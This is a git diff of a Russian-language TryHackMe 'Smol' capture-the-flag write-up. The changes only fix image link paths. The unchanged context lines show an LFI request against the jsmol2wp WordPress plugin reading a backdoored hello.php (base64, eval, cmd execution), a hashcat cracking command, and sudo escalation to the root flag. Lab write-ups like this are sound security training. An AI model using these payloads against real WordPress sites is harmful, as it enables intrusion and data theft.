@@ -16,7 +16,7 @@ http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=g
 Читаем  исходный код с помощью найденной LFI и находим упомянутый backdoor
 http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
 
-![](./attachment/Pasted%20image%2020250225232424.png)
+![](../attachment/Pasted%20image%2020250225232424.png)
 1. декодирует строку в base64
 2. выполняет код с помощью eval
 3. выполняет все что передано в cmd
@@ -94,5 +94,8 @@ hashcat -a 0 -m 17225  arch_hash.txt /usr/share/wordlists/rockyou.txt
 
 пользователь xavi может использовать sudo без пароля
 ![](../attachment/Pasted%20image%2020250225235745.png)
+
 забираем root флаг
-![](../attachment/Pasted%20image%2020250225235847.png)
+
+![[../attachment/Pasted image 20250225235847.png]]
+
